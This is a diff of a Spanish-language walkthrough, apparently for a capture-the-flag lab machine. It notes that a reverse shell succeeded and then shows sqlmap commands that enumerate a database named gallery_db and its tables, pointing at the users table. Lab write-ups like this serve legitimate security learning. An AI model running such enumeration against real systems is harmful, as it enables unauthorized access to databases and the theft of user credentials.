@@ -46,7 +46,9 @@ la rever shell ha funcionado tenemos conexion a la maquina
 
 ### analizando la maquina podemos ver que tenemos una base de datos
 ![[Pasted image 20240112220052.png]]
-###### usaremos sqlmap para enumerar esta base de datos
+usaremos sqlmap para enumerar esta base de datos
+
+### sqlmap 
 
 ```python
 sqlmap -r phpid.txt --dbs
@@ -59,5 +61,5 @@ ya tenemos el nombre de la base de datos. ahora vamos a enumerarla
 ```python
 sqlmap -r phpid.txt -D gallery_db --tables
 ```
-hemos enumerado las tablas de la base de da
+hemos enumerado las tablas de la base de datos. la tabla de users parece interesanta asi que vamos a echar un vistazo 
 ![[Pasted image 20240112223302.png]]
